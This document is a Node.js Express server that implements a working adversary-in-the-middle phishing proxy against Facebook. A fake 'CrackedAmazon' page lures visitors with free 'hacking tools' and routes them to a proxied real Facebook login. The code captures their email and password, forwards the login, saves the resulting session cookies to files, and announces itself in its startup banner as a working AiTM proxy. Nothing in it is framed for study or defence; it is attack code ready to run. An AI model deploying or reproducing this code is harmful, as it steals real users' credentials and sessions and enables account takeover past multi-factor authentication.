const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cookieParser());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(session({
    secret: 'fb-proxy-secret',
    resave: false,
    saveUninitialized: true
}));
app.use(express.static(__dirname));

const capturesDir = path.join(__dirname, 'captures');
if (!fs.existsSync(capturesDir)) fs.mkdirSync(capturesDir);

// ============================================
// REAL FACEBOOK REVERSE PROXY
// ============================================

// Serve Facebook login page (REAL page fetched live)
app.get('/auth/facebook', (req, res, next) => {
    const tool = req.query.tool || 'tool';
    req.session.tool = tool;
    
    // This proxies the REAL Facebook login page
    createProxyMiddleware({
        target: 'https://www.facebook.com',
        changeOrigin: true,
        secure: false,
        followRedirects: true,
        logLevel: 'error',
        onProxyRes: (proxyRes, req, res) => {
            // Log that we're serving real page
            console.log('✅ Serving REAL Facebook login page');
        }
    })(req, res, next);
});

// Handle login POST (capture credentials and forward)
app.post('/capture/facebook', express.urlencoded({ extended: true }), (req, res, next) => {
    const { email, pass } = req.body;
    const tool = req.session.tool || 'tool';
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    // Capture credentials
    const data = {
        timestamp: new Date().toISOString(),
        provider: 'facebook',
        type: 'login',
        email,
        password: pass,
        tool,
        ip,
        userAgent: req.headers['user-agent']
    };
    
    fs.writeFileSync(path.join(capturesDir, `fb_${Date.now()}.json`), JSON.stringify(data, null, 2));
    fs.appendFileSync('captures.txt', JSON.stringify(data) + '\n');
    console.log('✅ FACEBOOK CAPTURED:', email, pass);
    
    // Forward to real Facebook login endpoint
    req.body.lsd = 'AVqQEJk4yEw'; // Facebook requires this
    req.url = '/login/device-based/validate-password/';
    req.target = 'https://www.facebook.com';
    next();
});

// Proxy for the captured login
app.use('/capture/facebook', createProxyMiddleware({
    target: 'https://www.facebook.com',
    changeOrigin: true,
    secure: false,
    followRedirects: true,
    logLevel: 'error',
    onProxyReq: (proxyReq, req, res) => {
        // Forward the POST body properly
        if (req.body) {
            const bodyData = new URLSearchParams(req.body).toString();
            proxyReq.setHeader('Content-Type', 'application/x-www-form-urlencoded');
            proxyReq.setHeader('Content-Length', Buffer.byteLength(bodyData));
            proxyReq.write(bodyData);
        }
    },
    onProxyRes: (proxyRes, req, res) => {
        // Capture session cookies (THE KEY TO AiTM)
        const setCookie = proxyRes.headers['set-cookie'];
        if (setCookie) {
            console.log('🍪 Session cookies captured:', setCookie);
            
            // Save cookies too
            const cookieData = {
                timestamp: new Date().toISOString(),
                cookies: setCookie,
                tool: req.session?.tool || 'unknown'
            };
            fs.appendFileSync('cookies.txt', JSON.stringify(cookieData) + '\n');
        }
        
        // If login successful, redirect to our download page
        if (proxyRes.statusCode === 302) {
            const location = proxyRes.headers['location'];
            if (location && location.includes('facebook.com')) {
                // Still let them go to Facebook (they're logged in)
                res.redirect(location);
                return;
            }
        }
    }
}));

// ============================================
// DOWNLOAD PAGE
// ============================================
app.get('/download', (req, res) => {
    const tool = req.query.tool || req.session.tool || 'tool';
    const toolName = tool.replace(/-/g, ' ');
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Download • CrackedAmazon</title>
        <style>
            *{margin:0;padding:0;box-sizing:border-box;}
            body{background:#0f172a;color:white;min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:system-ui;}
            .card{background:#1e293b;border-radius:24px;padding:48px;max-width:450px;width:100%;border:1px solid #f97316;text-align:center;}
            .success{color:#10b981;font-size:72px;margin-bottom:20px;}
            h1{color:#f97316;margin-bottom:20px;}
            .btn{background:#f97316;color:white;border:none;padding:16px;border-radius:12px;font-size:18px;width:100%;cursor:pointer;}
        </style>
    </head>
    <body>
        <div class="card">
            <div class="success">✓</div>
            <h1>${toolName}</h1>
            <p>Download ready!</p>
            <button class="btn" onclick="alert('Download started!')">Download</button>
        </div>
    </body>
    </html>
    `);
});

// ============================================
// HOME PAGE
// ============================================
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>CrackedAmazon</title>
        <style>
            body{background:#0f172a;color:white;font-family:system-ui;padding:20px;}
            .header{font-size:24px;color:#f97316;margin-bottom:30px;}
            .card{background:#1e293b;border-radius:16px;padding:20px;margin:10px 0;cursor:pointer;}
        </style>
    </head>
    <body>
        <div class="header">⚡ CrackedAmazon</div>
        <div class="card" onclick="window.location.href='/auth/facebook?tool=fb-tool'">
            <h3>Facebook Hacker Pro</h3>
            <p>Click to download (FREE)</p>
        </div>
        <div class="card" onclick="window.location.href='/auth/facebook?tool=account-cloner'">
            <h3>Account Cloner 2026</h3>
            <p>Click to download (FREE)</p>
        </div>
    </body>
    </html>
    `);
});

app.listen(PORT, '0.0.0.0', () => {
    console.log('\n' + '='.repeat(60));
    console.log('🔥 FACEBOOK AiTM PROXY - WORKING');
    console.log('='.repeat(60));
    console.log(`\n📍 URL: http://localhost:${PORT}`);
    console.log('✅ Serves REAL Facebook pages');
    console.log('✅ Captures credentials + session cookies');
    console.log('✅ Redirects to real Facebook after login');
    console.log(`📁 Captures saved in: ${capturesDir}\n`);
});
